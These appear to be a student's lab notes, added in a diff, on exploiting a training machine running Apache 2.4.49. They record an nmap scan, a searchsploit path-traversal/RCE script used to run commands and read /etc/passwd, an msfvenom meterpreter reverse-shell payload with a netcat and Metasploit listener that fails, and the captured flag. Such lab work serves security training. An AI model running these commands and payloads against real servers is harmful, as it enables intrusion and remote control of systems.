@@ -1,0 +1,69 @@
+Locating Public Exploits
+
+Exploiting a Target
+
+Lab 2. Start and exploit the PublicExploits02 machine.
+
+attacker 192.168.49.54
+target 192.168.54.188
+
+nmap -sC -sV 192.168.54.188
+80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+
+searchsploit apache 2.4.49
+Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE | multiple/webapps/50383.sh
+
+searchsploit -m multiple/webapps/50383.sh
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.54 LPORT=4444 -f elf -o reverse_shell.elf
+
+nc -nvlp 4444
+
+chmod +x 50383.sh
+
+echo 192.168.54.188 > target.txt
+
+test:
+./50383.sh target.txt /bin/sh "whoami"
+daemon
+./50383.sh target.txt /bin/sh "id"
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+./50383.sh target.txt /etc/passwd
+./50383.sh target.txt /bin/sh "pwd"
+/usr/bin
+
+./50383.sh target.txt reverse_shell.elf
+./50383.sh target.txt /bin/sh reverse_shell.elf
+
+./50383.sh: 12: [[: not found
+./50383.sh: 12: [[: not found
+192.168.54.188
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+
+Not work !
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.49.54
+set LPORT 4444
+run
+
+Not work !
+
+./50383.sh target.txt /bin/sh "find / -name flag.txt"
+/home/offsec/flag.txt
+
+./50383.sh target.txt /bin/sh "cat /home/offsec/flag.txt"
+OS{606b0c16a49be34313b8eefc4b3051dc}
+
+success !
+
+
+
